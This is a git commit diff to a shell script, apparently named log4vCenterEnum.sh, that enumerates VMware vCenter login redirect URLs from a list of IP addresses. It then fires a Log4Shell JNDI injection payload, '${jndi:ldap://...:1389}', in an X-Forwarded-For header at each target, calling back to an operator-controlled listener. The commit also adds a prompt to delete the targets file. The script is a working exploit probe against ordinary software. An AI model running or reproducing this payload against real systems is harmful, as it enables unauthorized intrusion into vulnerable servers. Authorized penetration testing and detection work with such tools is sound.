eed00f4ef8cf2eb4a9cfa72197d5537a36015e2e
Alex <59406285+AlexKaos32@users.noreply.github.com>
2022-10-12 10:58:06 -0500

    Update log4vCenterEnum.sh

--- log4vCenterEnum.sh
+++ log4vCenterEnum.sh
@@ -8,15 +8,24 @@ do
 	esac
 done
 
+
 while read ip; do
-
 	curl -ski https://$ip/ui/login | grep location | cut -d " " -f 2 | cut -d "=" -f 1 | sed 's/$/=/' >> targets.txt
-
 done < $list
 
+
 while read host; do
-
 	curl --insecure -vv -H "X-Forwarded-For: \${jndi:ldap://${burp}:1389}" $host
-
 done < targets.txt
 
+
+while true; do
+	printf "\nWould you like to delete targets.txt? "
+	read yn
+	case $yn in
+		[Yy]* ) rm -rf targets.txt;
+			break;;
+		[Nn]* ) exit;;
+		* ) printf "\nJust gonna leave me hanging? You're a disappointment.\n";;
+	esac
+done
